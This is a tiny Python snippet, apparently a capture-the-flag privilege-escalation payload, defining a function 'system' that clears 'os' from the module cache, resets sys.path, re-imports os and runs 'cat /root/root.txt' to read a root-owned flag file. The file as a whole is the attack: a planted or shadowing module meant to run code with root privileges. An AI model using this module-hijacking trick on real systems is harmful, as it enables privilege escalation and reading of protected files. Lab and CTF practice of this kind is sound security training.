import sys

def system(input):
    sys.modules.pop('os', None)
    sys.path = ["/usr/lib/python3.5"]
    import os
    os.system("cat /root/root.txt")

